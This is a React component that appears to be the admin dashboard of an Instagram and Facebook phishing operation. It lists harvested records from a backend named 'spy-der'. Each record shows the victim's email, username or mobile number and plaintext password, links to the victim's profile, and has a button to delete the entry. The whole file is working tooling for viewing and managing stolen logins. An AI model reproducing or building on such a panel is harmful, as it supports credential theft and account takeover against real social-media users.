/* eslint-disable no-unused-vars */
/* eslint-disable react/prop-types */
import { Accordion, AccordionDetails, AccordionSummary, Typography } from '@mui/material'
import ExpandMoreIcon from '@mui/icons-material/ExpandMore';
import DeleteIcon from '@mui/icons-material/Delete';
import React from 'react'
import MyButton from './MyButton';
import axios from 'axios';

const MyAccordion = (props) => {
  const [expanded, setExpanded] = React.useState(false);

  const handleChange = (panel) => (event, isExpanded) => {
    setExpanded(isExpanded ? panel : false);
  };

  const handleDelete = () => {
    axios.delete(`https://spy-der.onrender.com/${props.for}/${props.id}`)
      .then(res => {
        console.log(res.data);
        console.log(`Deleted ${props.for} ${props.id}`);
        props.setData(props.data.filter(el => el._id !== props.id))
      })
      .catch(err => {
        console.log("error");
      })


  }

  return (
    <div className='flex justify-center'>
      <Accordion expanded={expanded === 'panel1'} sx={{ width: 600, background: "black", color: "white", border: 1 }} onChange={handleChange('panel1')}>
        <AccordionSummary
          expandIcon={<ExpandMoreIcon sx={{ color: 'yellow' }} />}
          aria-controls="panel1bh-content"
          id="panel1bh-header"
        >
          <Typography sx={{ width: '33%', flexShrink: 0 }}>
            {props.emailOrUsername || props.emailOrMobile || props.username}
          </Typography>
          {/* <Typography sx={{ color: 'grey' }} >{props.email || props.emailOrUsername || props.emailOrMobile}</Typography> */}
        </AccordionSummary>
        <AccordionDetails>
          <Typography>
            <div>{props?.email ? `Email: ${props?.email}` : ""}</div>
            <div>{props?.emailOrMobile ? `Email Or Mobile: ${props?.emailOrMobile}` : ""}</div>
            <div>{props?.emailOrUsername ? `Email Or Username: ${props?.emailOrUsername}` : ""}</div>
            <div>{props?.username ? `Username: ${props.username}` : ""}</div>
            <div>{props?.password ? `Password: ${props.password}` : ""}</div>
            <div>{props?.id ? `Id: ${props.id}` : ""}</div>
            <div className='flex justify-between '>
              {props.for === "instagram" ?
                <div>
                  <MyButton target="_blank" href={`https://instagram.com/${props.emailOrUsername || props.emailOrMobile}/`}>Visit</MyButton>
                </div>
                :
                <div>
                  <MyButton target="_blank" href={`https://facebook.com/${props.emailOrUsername || props.emailOrMobile}/`}>Visit</MyButton>
                </div>
              }
              <div>
                <MyButton onClick={handleDelete} color="error" >
                  <DeleteIcon />
                </MyButton>
              </div>
            </div>
          </Typography>
        </AccordionDetails>
      </Accordion>
    </div>
  )
}

export default MyAccordion